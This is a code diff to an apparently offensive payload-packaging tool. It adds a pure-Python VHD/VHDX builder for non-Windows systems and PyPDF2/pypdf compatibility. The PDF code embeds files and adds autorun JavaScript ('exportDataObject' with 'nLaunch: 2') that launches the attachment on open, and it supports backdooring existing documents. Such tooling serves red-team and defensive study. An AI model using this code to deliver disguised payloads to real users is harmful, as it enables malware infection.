@@ -6,11 +6,12 @@
 # - py7zr
 # - pycdlib
 # - cabarchive
-# - pypdf2
+# - pypdf2 (or its successor: pypdf)
 #
 
 import os, sys, re
 import glob
+import math
 import string
 import random
 import base64
@@ -28,10 +29,15 @@ import subprocess
 import ctypes
 #import libarchive
 
+import lib.vhd
 from io import StringIO
 
-from PyPDF2 import PdfReader, PdfWriter
-from PyPDF2.generic import DecodedStreamObject, NameObject, DictionaryObject, createStringObject, ArrayObject
+try:
+    from PyPDF2 import PdfReader, PdfWriter
+    from PyPDF2.generic import DecodedStreamObject, NameObject, DictionaryObject, TextStringObject, ArrayObject
+except ImportError:
+    from pypdf import PdfReader, PdfWriter
+    from pypdf.generic import DecodedStreamObject, NameObject, DictionaryObject, TextStringObject, ArrayObject
 
 try:
     from cStringIO import StringIO as BytesIO
@@ -46,7 +52,7 @@ except ImportError:
 
 
 def getFactoryPath(path, name = ''):
-    p = os.path.abspath(os.path.join(os.path.abspath(os.path.dirname(__file__)), '..' + os.sep + path))
+    p = os.path.abspath(os.path.join(os.path.abspath(os.path.dirname(__file__)), path))
     if name:
         p = os.path.abspath(os.path.join(p, name))
 
@@ -247,6 +253,7 @@ class Packager:
 
             tmpdir = tempfile.TemporaryDirectory()
             tmp = os.path.join(tmpdir.name, self.fileName)
+            os.makedirs(os.path.dirname(tmp), exist_ok=True)
             shutil.copy(infile, tmp)
             infile = tmp
 
@@ -521,13 +528,13 @@ class Packager:
 #            return False
 
     def packIntoVHD(self, infile, outfile):
+        if os.name != 'nt':
+            return self.packIntoVHDPosix(infile, outfile)
+
         diskpartFile = None
         diskpartFile2 = None
         vhdFile = None
         outfile = os.path.abspath(outfile)
-
-        if os.name != 'nt':
-            self.logger.fatal('VHD packaging works only on Windows.')
 
         if self.password:
             self.logger.fatal('VHD files do not support password encryption.')
@@ -831,6 +838,104 @@ DISKPART> select vdisk file={outfile}
 DISKPART> detach vdisk
 ''')
 
+    #
+    # On Linux/macOS there is no DISKPART, so dynamic VHD/VHDX images with a
+    # FAT12/16/32 filesystem are constructed entirely in pure Python
+    # (see lib/vhd.py). No administrator privileges are required.
+    #
+    def packIntoVHDPosix(self, infile, outfile):
+        try:
+            if self.password:
+                self.logger.fatal('VHD/VHDX files do not support password encryption.')
+
+            if self.backdoorFile:
+                self.logger.fatal('Backdooring existing VHD/VHDX files is supported only on Windows.')
+
+            imageFormat = 'vhdx' if os.path.splitext(outfile)[1].lower() == '.vhdx' else 'vhd'
+            vhdfs = self.options.get('vhd_filesystem', 'fat32') or 'fat32'
+
+            if self.options.get('vhd_letter'):
+                self.logger.info('NOTE: --vhd-letter is a Windows-only option and will be ignored on this platform.')
+
+            if vhdfs == 'ntfs':
+                self.logger.fatal(
+                    'NTFS filesystem cannot be created on non-Windows systems.\n'
+                    '\tUse the default FAT32 (--vhd-filesystem fat32) or run this program on Windows.')
+
+            files = []
+
+            if os.path.isfile(infile):
+                name = os.path.basename(infile)
+                if self.fileName:
+                    name = self.fileName
+                files.append((name.replace('\\', '/'), infile))
+
+            else:
+                subdirs = False
+
+                for fname in glob.iglob(infile + '/**/*', recursive=True):
+                    if os.path.isdir(fname):
+                        subdirs = True
+                        continue
+
+                    rel = os.path.relpath(fname, infile).replace(os.sep, '/')
+                    files.append((rel, fname))
+
+                if subdirs:
+                    self.logger.info('Input directory contained subdirectories - they will be recreated inside the volume.')
+
+            if len(files) == 0:
+                self.logger.fatal('No input files found to pack into VHD/VHDX.')
+
+            totalSize = sum(os.path.getsize(f[1]) for f in files)
+            vhdsize = self.options.get('vhd_size') or 1024
+
+            self.logger.info(f'Will create {imageFormat.upper()} of size:\t{vhdsize}MB (Dynamic)')
+            self.logger.info(f'Will use filesystem:\t{vhdfs.upper()}')
+
+            raw = None
+            info = None
+
+            for attempt in range(4):
+                try:
+                    raw, info = lib.vhd.build_raw_disk(files, vhdsize * 1024 * 1024, vhdfs, imageFormat)
+                    break
+
+                except lib.vhd.VhdTooSmall as e:
+                    if e.needed_bytes == 0:
+                        raise
+
+                    needed = math.ceil(e.needed_bytes / (1024 * 1024)) + 16
+                    if needed <= vhdsize:
+                        needed = vhdsize * 2
+
+                    self.logger.info(f'Requested VHD size is too small for input files. Bumping size to {needed}MB...')
+                    vhdsize = needed
+
+            if raw is None:
+                self.logger.fatal('Could not fit input files into a VHD/VHDX image.')
+
+            self.logger.text('[.] Building filesystem & disk image structures...')
+
+            with open(outfile, 'wb') as f:
+                if imageFormat == 'vhdx':
+                    lib.vhd.write_vhdx(f, raw)
+                else:
+                    lib.vhd.write_dynamic_vhd(f, raw)
+
+            self.logger.info(f'Created {imageFormat.upper()} containing {info["filesystem"]} filesystem '
+                f'(cluster size: {info["cluster_size"]} bytes, files: {len(files)}, total input size: {totalSize}).')
+
+            self.logger.text(f'[+] File packed into {imageFormat.upper()}.', color='green')
+            return True
+
+        except Exception as e:
+            self.logger.err(f'Could not package input file into VHD/VHDX! Exception: {e}')
+            if self.options.get('debug', False):
+                traceback.print_exc()
+
+            return False
+
     def collectIsoJolietFiles(self, iso, basedir = '/'):
         files = []
         for dirname, dirlist, filelist in iso.walk(joliet_path=basedir):
@@ -1037,7 +1142,10 @@ DISKPART> detach vdisk
     def pdfAppendAttachment(self, myPdfFileWriterObj, fname, fdata):
         # The entry for the file
         file_entry = DecodedStreamObject()
-        file_entry.setData(fdata)
+        if hasattr(file_entry, 'set_data'):
+            file_entry.set_data(fdata)
+        else:
+            file_entry.setData(fdata)
         file_entry.update({
             NameObject("/Type"): NameObject("/EmbeddedFile")
         })
@@ -1051,7 +1159,7 @@ DISKPART> detach vdisk
         filespec = DictionaryObject()
         filespec.update({
             NameObject("/Type"): NameObject("/Filespec"),
-            NameObject("/F"): createStringObject(fname),
+            NameObject("/F"): TextStringObject(fname),
             NameObject("/EF"): efEntry
         })
 
@@ -1060,7 +1168,7 @@ DISKPART> detach vdisk
             
             embeddedFilesNamesDictionary = DictionaryObject()
             embeddedFilesNamesDictionary.update({
-                NameObject("/Names"): ArrayObject([createStringObject(fname), filespec])
+                NameObject("/Names"): ArrayObject([TextStringObject(fname), filespec])
             })
 
             embeddedFilesDictionary = DictionaryObject()
@@ -1075,7 +1183,7 @@ DISKPART> detach vdisk
         else:
             self.logger.dbg('There are files already attached. Append the new file.')
 
-            myPdfFileWriterObj._root_object["/Names"]["/EmbeddedFiles"]["/Names"].append(createStringObject(fname))
+            myPdfFileWriterObj._root_object["/Names"]["/EmbeddedFiles"]["/Names"].append(TextStringObject(fname))
             myPdfFileWriterObj._root_object["/Names"]["/EmbeddedFiles"]["/Names"].append(filespec)
 
 
@@ -1125,16 +1233,23 @@ Pssst. .doc/.xls work like a charm ;-)
                 self.logger.text('Copying pages from backdoored PDF to the output one...')
 
                 fr = PdfReader(self.backdoorFile, 'rb')
-                fw.appendPagesFromReader(fr)
-                self.logger.info(f'Copied {fr.numPages} pages from backdoored file to output.')
+
+                # PyPDF2 >= 2.10 / pypdf use append(), older releases appendPagesFromReader()
+                if hasattr(fw, 'append'):
+                    fw.append(fr)
+                else:
+                    fw.appendPagesFromReader(fr)
+
+                numPages = len(fr.pages) if hasattr(fr, 'pages') else fr.numPages
+                self.logger.info(f'Copied {numPages} pages from backdoored file to output.')
 
             else:
                 self.logger.text('Creating a new PDF with a single, blank page.')
 
-                fw.addBlankPage(
-                    width = 200,
-                    height = 200
-                )
+                if hasattr(fw, 'add_blank_page'):
+                    fw.add_blank_page(width = 200, height = 200)
+                else:
+                    fw.addBlankPage(width = 200, height = 200)
 
             files = []
 
@@ -1164,15 +1279,21 @@ Pssst. .doc/.xls work like a charm ;-)
 
                 autorunJs = f'this.exportDataObject({{ cName: "{fname}", nLaunch: 2 }});'
                 self.logger.dbg('\t' + autorunJs + '\n')
-                
-                fw.addJS(autorunJs)
+
+                if hasattr(fw, 'add_js'):
+                    fw.add_js(autorunJs)
+                else:
+                    fw.addJS(autorunJs)
 
                 if len(files) == 1:
                     if self.fileName:
                         fname = self.fileName
 
                     self.logger.text(f'\tAdding file: {fname}')
-                    fw.addAttachment(fname, data)
+                    if hasattr(fw, 'add_attachment'):
+                        fw.add_attachment(fname, data)
+                    else:
+                        fw.addAttachment(fname, data)
 
                 else:
                     self.logger.text(f'\tAdding file: {fname}')
